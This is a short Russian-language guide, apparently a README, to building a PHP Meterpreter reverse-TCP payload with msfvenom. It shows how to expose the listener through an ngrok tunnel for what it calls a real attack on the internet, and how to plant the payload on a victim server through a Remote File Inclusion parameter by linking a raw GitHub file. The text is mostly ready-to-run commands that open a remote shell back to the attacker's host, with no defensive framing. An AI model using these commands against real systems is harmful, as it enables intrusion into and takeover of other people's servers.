Генерируем payload php в msfvenom.

Синтаксис:
msfvenom -p нужный payload LHOST=ip_адрес LPORT=порт -f формат_файла > имя_файла_на_выходе

Файл local_meterpreter_reverse_tcp.php - файл с локальным ip адрессом в LHOST (сетевой адаптер в режиме NAT), используется если атакующая машинка и сервер-жертва в одной сети.
Пример:
msfvenom -p php/meterpreter_reverse_tcp LHOST ip_адрес LPORT=4444 -f raw > local_meterpreter_reverse_tcp.php

Для того, чтобы провести реальную атаку в интернете стоит использовать ngrok.
Создаём payload на php используюя ngrok для ip адресации (т.к. машинка в NAT, то ngrok прокидывает порты на домен и решает проблему доступнсти ip адреса только внутри сети), грубо говоря: даёшь ngrok-у локальный ip и порт, а он возвращает тебе глобальный.
Как с этим всем работать:
1) ngrok tcp 4444
2) ngrok выдасть нам:
Forwarding   tcp://6.tcp.eu.ngrok.io:15089 -> localhost:4444
3) LHOST=6.tcp.eu.ngrok.io  LPORT=15089
4) msfvenom -p php/meterpreter_reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=15089 -f raw > global_meterpreter_reverse_tcp.php 

Как работать с payloadom:
1) Тыкаем на скрипт
2) Нажимаем Raw
3) Копируем ссылку из адресной строки
4) Вставляем в RFI (к примеру: .....?file=url ссылка на наш GitHub код)
